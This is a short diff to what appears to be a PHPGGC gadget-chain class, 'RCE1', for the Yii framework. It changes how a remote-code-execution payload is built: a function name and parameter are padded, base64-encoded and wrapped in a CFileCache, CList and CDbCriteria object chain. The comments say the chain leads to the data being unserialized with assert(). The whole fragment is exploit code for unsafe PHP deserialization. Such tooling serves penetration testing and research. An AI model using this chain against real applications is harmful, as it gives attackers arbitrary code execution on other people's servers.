@@ -16,11 +16,12 @@ class RCE1 extends \PHPGGC\GadgetChain\RCE
     {
     	// When hitting the file cache, our data:// wrapper will be fetched,
     	// and it will be unserialized with assert().
-        $code = $parameters['code'];
-        $code = '9999999999' . $code;
-        $code = base64_encode($code);
+        $function = $parameters['function'];
+        $parameter = $parameters['parameter'];
+        $parameter = '9999999999' . $parameter;
+        $parameter = base64_encode($parameter);
 
-        $a = new \CFileCache($code);
+        $a = new \CFileCache($function, $parameter);
         $b = new \CList($a);
         $c = new \CDbCriteria($b);
 
